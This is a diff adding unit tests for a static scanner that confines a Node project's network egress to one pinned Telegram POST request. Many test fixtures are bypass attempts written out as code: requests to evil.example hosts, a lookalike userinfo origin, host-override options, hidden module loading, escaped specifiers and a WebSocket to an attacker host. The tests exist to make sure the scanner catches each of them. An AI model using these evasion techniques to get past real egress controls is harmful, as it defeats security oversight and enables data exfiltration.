@@ -18,6 +18,7 @@ import { fileURLToPath } from 'node:url';
 import * as registry from './runtime-executor-registry.mjs';
 import {
   stripComments, scanFile, auditScripts, parseArgvArray, normalizeElement, matchVerbPath,
+  validatePinnedHttpsRequest, findImports,
 } from './runtime-executor-scan.mjs';
 
 const REPO_ROOT = resolve(fileURLToPath(import.meta.url), '../../..');
@@ -553,6 +554,390 @@ describe('ADR-0041 §2d guard — global fetch egress (per-source negative confo
 });
 
 // ---------------------------------------------------------------------------
+// (c) Negative-conformance — ADR-0041 §2d node:https egress (transport fix)
+// ---------------------------------------------------------------------------
+
+describe('ADR-0041 §2d guard — pinned node:https egress (per-source negative conformance)', () => {
+  // The pinned E1 node:https transport the `impl` slice will add to notify.mjs (the
+  // fetch → node:https swap): a direct `https.request(url, options)` to the fixed
+  // Telegram host, method POST, a bounded timeout, URL a template whose STATIC prefix
+  // is the allowlisted origin (token interpolated only AFTER it). node:https does NOT
+  // follow redirects, so there is no redirect key — a redirect-FOLLOW would need a
+  // SECOND request, which maxCalls forbids. The IPv4-preferred→fallback is a loop
+  // around this SINGLE call site (varying only the non-pinned `family`).
+  const IMPORT = "import https from 'node:https';";
+  // The bound is `signal: AbortSignal.timeout(...)` (auto-aborting) — the only statically
+  // verifiable timeout (a bare `timeout:` option merely emits an event; see MAJOR-2 below).
+  // The options carry ONLY the allowlisted keys method/family/signal/timeout/headers.
+  const PINNED = `${IMPORT} const token = 't'; https.request(\`https://api.telegram.org/bot\${token}/sendMessage\`, { method: 'POST', family: 4, signal: AbortSignal.timeout(5000), headers: { 'content-type': 'application/json' } }, (res) => {});`;
+
+  it('the pinned Telegram node:https request in notify.mjs → NO finding', () => {
+    deepStrictEqual(scan('notify.mjs', PINNED), []);
+  });
+
+  it('the same via a namespace import (import * as https) → NO finding', () => {
+    deepStrictEqual(scan('notify.mjs', "import * as https from 'node:https'; https.request(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', signal: AbortSignal.timeout(5000) });"), []);
+  });
+
+  it('a bounded AbortSignal.timeout is the only accepted timeout → NO finding', () => {
+    deepStrictEqual(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', signal: AbortSignal.timeout(5000) });`), []);
+  });
+
+  it('a bare timeout: option (no auto-abort, Codex MAJOR) → pinned-https-gate', () => {
+    // A bare `timeout:` only emits a 'timeout' event; it does not abort the socket, so it
+    // cannot be statically verified to bound the request — signal is required.
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', timeout: TELEGRAM_API_TIMEOUT_MS });`)).includes('pinned-https-gate'));
+  });
+
+  // --- ADR-0041 §2d fail-closed matrix ---------------------------------------
+  it('non-notify egress: the pinned request in another runtime file → import-gate', () => {
+    ok(rules(scan('cutover-audit.mjs', PINNED)).includes('import-gate'));
+  });
+
+  it('a non-POST method → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'GET', timeout: 5000 });`)).includes('pinned-https-gate'));
+  });
+
+  it('a non-allowlisted origin → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://evil.example.com/send', { method: 'POST', timeout: 5000 });`)).includes('pinned-https-gate'));
+  });
+
+  it('a userinfo-trick lookalike origin (api.telegram.org@evil.com) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org@evil.com/x', { method: 'POST', timeout: 5000 });`)).includes('pinned-https-gate'));
+  });
+
+  it('the origin-only-but-wrong-endpoint (/deleteWebhook) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/deleteWebhook', { method: 'POST', timeout: 5000 });`)).includes('pinned-https-gate'));
+  });
+
+  it('a missing timeout → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST' });`)).includes('pinned-https-gate'));
+  });
+
+  it('an explicitly-disabled timeout (timeout: 0) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 0 });`)).includes('pinned-https-gate'));
+  });
+
+  it('redirect-following (a SECOND manual request to a Location) → pinned-https-gate (maxCalls)', () => {
+    const src = `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', timeout: 5 });`
+      + ` https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', timeout: 5 });`;
+    ok(rules(scan('notify.mjs', src)).includes('pinned-https-gate'));
+  });
+
+  it('a non-literal (variable) URL → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request(url, { method: 'POST', timeout: 5000 });`)).includes('pinned-https-gate'));
+  });
+
+  it('URL via concatenation defeating the pinned literal → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot' + evil, { method: 'POST', timeout: 5000 });`)).includes('pinned-https-gate'));
+  });
+
+  // --- indirection (defeats static pinned validation) ------------------------
+  it('an aliased request (const r = https.request) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} const r = https.request; r(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
+  });
+
+  it('a destructured request (const { request } = https) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} const { request } = https; request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
+  });
+
+  it("a computed request (https['request']) → pinned-https-gate", () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https['request']('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
+  });
+
+  it('a .call-applied request (https.request.call) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request.call(null, 'https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
+  });
+
+  it('a namespace alias then member call (const agent = https; agent.request(evil)) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} const agent = https; agent.request('https://evil.example/x', { method: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
+  });
+
+  it('the binding passed as a value (registerTransport(https)) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} registerTransport(https);`)).includes('pinned-https-gate'));
+  });
+
+  it('a named primitive import (import { request } from node:https) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', "import { request } from 'node:https'; request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5 });")).includes('pinned-https-gate'));
+  });
+
+  it('a dynamic import of node:https in notify.mjs → import-gate', () => {
+    ok(rules(scan('notify.mjs', "const https = await import('node:https');")).includes('import-gate'));
+  });
+
+  // --- other network methods on the binding (only request is permitted) ------
+  it('any OTHER https member method (https.get) → pinned-https-gate', () => {
+    const src = `${IMPORT} https.get('https://api.telegram.org/x', () => {});`
+      + ` https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', timeout: 5 });`;
+    ok(rules(scan('notify.mjs', src)).includes('pinned-https-gate'));
+  });
+
+  // --- init-object override hazards (mirror the fetch hardening) -------------
+  it('a spread that overrides the pinned options → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5, ...evil });`)).includes('pinned-https-gate'));
+  });
+
+  it('a duplicate later method key overriding the pinned one → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5, method: 'GET' });`)).includes('pinned-https-gate'));
+  });
+
+  it('a getter property overriding a pinned key at runtime → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', get timeout() { return 0; } });`)).includes('pinned-https-gate'));
+  });
+
+  it('a computed method key (dynamic injection) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { ['method']: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
+  });
+
+  // --- Fail-CLOSED must not over-reject the legitimate forms -----------------
+  it('a node:https-mentioning string in a non-registered file is NOT flagged (no over-reject)', () => {
+    deepStrictEqual(scan('cutover-audit.mjs', 'const help = "https.request(url, options)";'), []);
+  });
+
+  it('the pinned tokens buried in a nested string, real request is GET → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'GET', timeout: 5, note: "method:'POST'" });`)).includes('pinned-https-gate'));
+  });
+
+  it('the full realistic call (template URL + JSON body + headers + callback) → NO finding', () => {
+    const src = `${IMPORT} const token = 't'; const body = JSON.stringify({}); `
+      + "const req = https.request(`https://api.telegram.org/bot${token}/sendMessage`, "
+      + "{ method: 'POST', family: 4, signal: AbortSignal.timeout(5000), headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) } }, (res) => { res.resume(); });";
+    deepStrictEqual(scan('notify.mjs', src), []);
+  });
+
+  it('the IPv4-preferred→fallback retry as a LOOP around a single call site → NO finding (not over-rejected)', () => {
+    // The impl shape maxCalls:1 permits: ONE `https.request(` call site, invoked in a
+    // family-retry loop (only the non-pinned `family` varies). The binding appears ONLY
+    // in the import + this one member call → aliasedNamespace stays false; req.write/
+    // req.end/req.on are on the ClientRequest, not the binding. NOTE: the guard proves the
+    // SHAPE is pinned + single-site; it does NOT prove the idempotency invariant ("no retry
+    // after a body write") — that is a runtime/behavioral property the acceptance-gate
+    // subtask + the §2b unit test enforce (Codex plan-verify MAJOR, acknowledged boundary).
+    const src = `${IMPORT} const token = 't'; const body = '{}';`
+      + " async function send() { for (const family of [4, undefined]) {"
+      + " const req = https.request(`https://api.telegram.org/bot${token}/sendMessage`,"
+      + " { method: 'POST', family, signal: AbortSignal.timeout(TELEGRAM_API_TIMEOUT_MS), headers: { 'content-type': 'application/json' } },"
+      + " (res) => { res.resume(); }); req.on('error', () => {}); req.write(body); req.end(); } }";
+    deepStrictEqual(scan('notify.mjs', src), []);
+  });
+
+  // --- direct validator unit tests (import-gate-independent) ------------------
+  const SPEC = registry.PINNED_HTTPS_USERS['notify.mjs'];
+  const S = 'signal: AbortSignal.timeout(5000)';
+  it('validatePinnedHttpsRequest: the pinned shape → null', () => {
+    strictEqual(validatePinnedHttpsRequest(`\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${S} }`, SPEC), null);
+  });
+  it('validatePinnedHttpsRequest: 2 or 3 args allowed, 1 or 4 rejected', () => {
+    strictEqual(validatePinnedHttpsRequest(`\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${S} }, cb`, SPEC), null);
+    ok(typeof validatePinnedHttpsRequest("`https://api.telegram.org/bot${t}/sendMessage`", SPEC) === 'string');
+    ok(typeof validatePinnedHttpsRequest(`\`https://api.telegram.org/bot\${t}/sendMessage\`, {}, cb, extra`, SPEC) === 'string');
+  });
+  it('validatePinnedHttpsRequest: each pinned-shape violation → a string', () => {
+    for (const bad of [
+      `'https://evil/x', { method: 'POST', ${S} }`,                       // origin
+      `\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'GET', ${S} }`, // method
+      "`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST' }",            // no timeout mechanism
+      "`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', timeout: 5000 }", // bare timeout, no signal
+      `url, { method: 'POST', ${S} }`,                                    // non-literal url
+      `\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${S}, hostname: 'evil.com' }`, // override key
+      `\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${S} } && { method: 'GET' }`,  // trailing expr
+    ]) ok(typeof validatePinnedHttpsRequest(bad, SPEC) === 'string', `expected a violation for: ${bad}`);
+  });
+
+  // --- the findImports lone-default fix this gate depends on ------------------
+  it('findImports now parses a LONE default capability import (fail-open hole closed)', () => {
+    const { staticImports } = findImports("import https from 'node:https';");
+    deepStrictEqual(staticImports, [{ module: 'node:https', names: [{ imported: 'default', local: 'https' }], namespace: null }]);
+    // and it still parses named / namespace / default+named forms unchanged
+    strictEqual(findImports("import { get } from 'node:https';").staticImports[0].names[0].imported, 'get');
+    strictEqual(findImports("import * as h from 'node:https';").staticImports[0].namespace, 'h');
+    strictEqual(findImports("import https, { get } from 'node:https';").staticImports[0].names.length, 2);
+  });
+
+  it('a lone-default capability import in a NON-importer file → import-gate (was previously invisible)', () => {
+    ok(rules(scan('worktree.mjs', "import cp from 'node:child_process';")).includes('import-gate'));
+  });
+
+  // --- Codex plan-verify hardening (bypasses the first pass missed) -----------
+  const OK = 'signal: AbortSignal.timeout(5)';
+
+  // CRITICAL: node:https merges options OVER the URL — a connection-redirect key escapes
+  // the pinned host. Only method/family/signal/timeout/headers are allowlisted.
+  for (const key of ['hostname', 'host', 'path', 'port', 'protocol', 'socketPath', 'href', 'lookup', 'agent', 'createConnection', 'rejectUnauthorized']) {
+    it(`an options override key (${key}) redirecting off the pinned host → pinned-https-gate`, () => {
+      ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK}, ${key}: x });`)).includes('pinned-https-gate'));
+    });
+  }
+  it('a stray non-allowlisted option key (proxy) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK}, proxy: 'http://evil' });`)).includes('pinned-https-gate'));
+  });
+
+  // CRITICAL: multiple node:https bindings — one validated while another egresses unchecked.
+  it('multiple bindings (import https, * as h) — the unchecked evil egress is caught → pinned-https-gate', () => {
+    const src = `import https, * as h from 'node:https';`
+      + ` https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`
+      + ` h.request('https://evil.example.com/x', { method: 'GET', ${OK} });`;
+    ok(rules(scan('notify.mjs', src)).includes('pinned-https-gate'));
+  });
+  it('two separate node:https import statements → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `import https from 'node:https'; import h from 'node:https'; https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`)).includes('pinned-https-gate'));
+  });
+
+  // CRITICAL: any named import from node:https (incl. string-literal `'request' as r`).
+  it('a renamed named import (import { request as r }) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `import { request as r } from 'node:https'; r('https://evil.example.com/x', { method: 'GET', ${OK} });`)).includes('pinned-https-gate'));
+  });
+  it('a default + named import (import https, { get }) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `import https, { get } from 'node:https'; https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`)).includes('pinned-https-gate'));
+  });
+
+  // CRITICAL: createRequire re-opens require() of any capability module.
+  it('createRequire from node:module (dynamic require of node:https) → import-gate', () => {
+    const src = "import { createRequire } from 'node:module'; const req = createRequire(import.meta.url);"
+      + " const h = req('node:https'); h.request('https://evil.example.com/x', {});";
+    ok(rules(scan('notify.mjs', src)).includes('import-gate'));
+  });
+
+  // MAJOR: fetch + node:https both active in the same file = double-send.
+  it('both a pinned fetch AND a pinned https.request active (double-send) → pinned-https-gate', () => {
+    const src = `${IMPORT} fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', ${OK} });`
+      + ` https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`;
+    ok(rules(scan('notify.mjs', src)).includes('pinned-https-gate'));
+  });
+
+  // MAJOR: a trailing operator/expression after the options object ( {pinned} && {evil} ).
+  it('a trailing && expression after the https options object → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} } && { method: 'GET' });`)).includes('pinned-https-gate'));
+  });
+  it('the same trailing-expression hole on the fetch path is also closed → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) } && { method: 'GET', redirect: 'follow' });")).includes('global-fetch-gate'));
+  });
+
+  // MINOR: a computed-request mention INSIDE a string must not over-reject (strings blanked).
+  it('a computed-request string mention in a registered file is NOT over-rejected', () => {
+    deepStrictEqual(scan('notify.mjs', `${IMPORT} const help = "https['request'](url)"; https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`), []);
+  });
+
+  // --- Codex round-2 (adversarial re-verify) hardening -----------------------
+  // CRITICAL: `$` is a valid identifier char AND a regex metacharacter — an unescaped
+  // binding voids the analysis. The binding must be regex-escaped everywhere.
+  it('a $-containing binding still validates the pinned call → NO finding', () => {
+    deepStrictEqual(scan('notify.mjs', `import h$ from 'node:https'; h$.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`), []);
+  });
+  it('a $-containing binding egressing elsewhere is still caught → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `import h$ from 'node:https'; h$.request('https://evil.example/x', { method: 'GET', ${OK} });`)).includes('pinned-https-gate'));
+  });
+
+  // CRITICAL: a non-ASCII / \u-escaped binding evades the ASCII findImports grammar — the
+  // guard fails closed on the unparseable capability import (its module string is ASCII).
+  it('a non-ASCII import binding (import η from node:https) → import-gate (fail-closed on unparseable)', () => {
+    ok(rules(scan('notify.mjs', `import η from 'node:https'; η.request('https://evil.example/x', { method: 'GET', ${OK} });`)).includes('import-gate'));
+  });
+  it('a \\u-escaped import binding → import-gate', () => {
+    ok(rules(scan('notify.mjs', "import h\\u0074tps from 'node:https'; x.request('https://evil.example/x', {});")).includes('import-gate'));
+  });
+  it('a legit ASCII import PLUS an evasive non-ASCII one → import-gate (count mismatch)', () => {
+    const src = `import https from 'node:https'; import η from 'node:https';`
+      + ` https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`
+      + ` η.request('https://evil.example/x', {});`;
+    ok(rules(scan('notify.mjs', src)).includes('import-gate'));
+  });
+
+  // CRITICAL: process.getBuiltinModule (Node ≥22.3) loads a builtin without import/require.
+  it('process.getBuiltinModule(node:https) → import-gate', () => {
+    ok(rules(scan('notify.mjs', "const https = process.getBuiltinModule('node:https'); https.request('https://evil.example/x', {});")).includes('import-gate'));
+  });
+  it('a destructured getBuiltinModule → import-gate', () => {
+    ok(rules(scan('notify.mjs', "const { getBuiltinModule } = process; const h = getBuiltinModule('node:https'); h.request('https://evil.example/x', {});")).includes('import-gate'));
+  });
+  it('a mere string mention of getBuiltinModule is NOT flagged (no over-reject)', () => {
+    deepStrictEqual(scan('cutover-audit.mjs', 'const doc = "avoid process.getBuiltinModule here";'), []);
+  });
+
+  // MINOR: an explicit object KEY named like the binding ({ https: true }) is not a value
+  // leak and must not over-reject; a shorthand ({ https }) IS a value leak and is caught.
+  it('an object key named like the binding ({ https: true }) is NOT over-rejected', () => {
+    deepStrictEqual(scan('notify.mjs', `${IMPORT} const meta = { https: true }; https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`), []);
+  });
+  it('a binding shorthand ({ https }) IS a value leak → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} const o = { https }; https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`)).includes('pinned-https-gate'));
+  });
+
+  // --- Codex round-3 (final adversarial re-verify) hardening -----------------
+  // CRITICAL: a decoy import-looking STRING must not neutralize the unparseable-import check.
+  it('a decoy import string + a real non-ASCII import → import-gate (decoy neutralization defeated)', () => {
+    const src = `const doc = "import https from 'node:https'"; import η from 'node:https';`
+      + ` η.request('https://evil.example/x', { method: 'GET', ${OK} });`;
+    ok(rules(scan('notify.mjs', src)).includes('import-gate'));
+  });
+
+  // CRITICAL: a `$`-terminated binding used as a value/destructure (the `\b` boundary bug).
+  it('a $-binding aliased as a value (const agent = h$) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `import h$ from 'node:https'; const agent = h$; agent.request('https://evil.example/x', { method: 'GET', ${OK} });`)).includes('pinned-https-gate'));
+  });
+  it('a $-binding destructured (const { request } = h$) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `import h$ from 'node:https'; const { request } = h$; request('https://evil.example/x', { method: 'GET', ${OK} });`)).includes('pinned-https-gate'));
+  });
+
+  // CRITICAL: computed-string getBuiltinModule (process['getBuiltinModule']).
+  it("computed process['getBuiltinModule'] → import-gate", () => {
+    ok(rules(scan('notify.mjs', "const https = process['getBuiltinModule']('node:https'); https.request('https://evil.example/x', {});")).includes('import-gate'));
+  });
+
+  // CRITICAL: escaped module specifiers resolve to a watched builtin off the literal watch list.
+  it('an escaped module specifier (node:http\\u0073) in a static import → import-gate', () => {
+    ok(rules(scan('notify.mjs', `import https from 'node:http\\u0073'; https.request('https://evil.example/x', { method: 'GET', ${OK} });`)).includes('import-gate'));
+  });
+  it('an escaped module specifier in a dynamic import()/require() → import-gate', () => {
+    ok(rules(scan('notify.mjs', "const h = await import('node:http\\u0073');")).includes('import-gate'));
+    ok(rules(scan('notify.mjs', "const h = require('node:http\\u0073');")).includes('import-gate'));
+  });
+
+  // CRITICAL: non-request namespace surfaces (any binding member access other than request(...)).
+  it('a deeper namespace surface (https.globalAgent.createConnection) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} https.globalAgent.createConnection({ host: 'evil.example', port: 443 }, () => {});`)).includes('pinned-https-gate'));
+  });
+  it('a non-request method captured as a value (const g = https.get) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} const g = https.get; g('https://evil.example/x', () => {});`)).includes('pinned-https-gate'));
+  });
+
+  // HIGH: a local AbortSignal shadow makes the signal bound untrusted.
+  it('a local AbortSignal shadow in the egress file → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} const AbortSignal = { timeout() { return undefined; } }; https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`)).includes('pinned-https-gate'));
+  });
+
+  // --- Codex round-4 (convergence) hardening ---------------------------------
+  // HIGH: the AbortSignal shadow must be caught in EVERY binding form, incl. a PARAMETER.
+  it('an AbortSignal PARAMETER shadow (function f(AbortSignal)) → pinned-https-gate', () => {
+    ok(rules(scan('notify.mjs', `${IMPORT} function f(AbortSignal) { https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} }); }`)).includes('pinned-https-gate'));
+  });
+  // A legitimate single `AbortSignal.timeout(...)` use is NOT flagged.
+  it('a legitimate single AbortSignal.timeout use is NOT over-rejected', () => {
+    deepStrictEqual(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`), []);
+  });
+
+  // CRITICAL: the global WebSocket (Node ≥22) is an import-less egress primitive.
+  it('the global WebSocket in a runtime script → global-websocket-gate', () => {
+    ok(rules(scan('notify.mjs', "const ws = new WebSocket('wss://evil.example/x'); ws.send('x');")).includes('global-websocket-gate'));
+  });
+  it('WebSocket in ANY runtime file (not just the egress file) → global-websocket-gate', () => {
+    ok(rules(scan('cutover-audit.mjs', "const ws = new WebSocket('wss://evil.example/x');")).includes('global-websocket-gate'));
+  });
+  it('a mere string mention of WebSocket is NOT flagged', () => {
+    deepStrictEqual(scan('cutover-audit.mjs', 'const doc = "do not open a WebSocket";'), []);
+  });
+
+  // Regression: a pinned request alongside a legit \u-bearing scrub regex (as in the real
+  // notify.mjs control-char scrub) must NOT be over-rejected by the WebSocket/AbortSignal/
+  // escaped-identifier checks (which is why escaped-USE is a documented §2b residual).
+  it('a pinned request next to a \\u-bearing control-scrub regex → NO finding', () => {
+    const src = `${IMPORT} const SCRUB = /[\\u0000-\\u001F\\u007F-\\u009F]/g; const clean = raw.replace(SCRUB, '');`
+      + ` https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`;
+    deepStrictEqual(scan('notify.mjs', src), []);
+  });
+});
+
+// ---------------------------------------------------------------------------
 // (c) Registry drift — registry never looser than the code
 // ---------------------------------------------------------------------------
 
@@ -574,6 +959,18 @@ describe('ADR-0035 §4 guard — registry drift', () => {
     for (const file of files) {
       const src = await readFile(resolve(RUNTIME_SCRIPTS, file), 'utf-8');
       ok(src.length > 0, `${file} should exist`);
+    }
+  });
+
+  it('every PINNED_HTTPS_USERS file exists and its module is a watched capability', async () => {
+    // PINNED_HTTPS_USERS is deliberately NOT import-drift-checked (it is
+    // inert-registerable BEFORE the impl slice adds the import — ADR-0041 §11
+    // scanner-gate-before-use), but the file must exist and its `module` must be a
+    // real watched capability so the entry can never grant an unwatched reach.
+    for (const [file, spec] of Object.entries(registry.PINNED_HTTPS_USERS)) {
+      const src = await readFile(resolve(RUNTIME_SCRIPTS, file), 'utf-8');
+      ok(src.length > 0, `${file} should exist`);
+      ok(registry.WATCHED_CAPABILITY_MODULES.includes(spec.module), `${file} pinned module ${spec.module} must be watched`);
     }
   });
 });
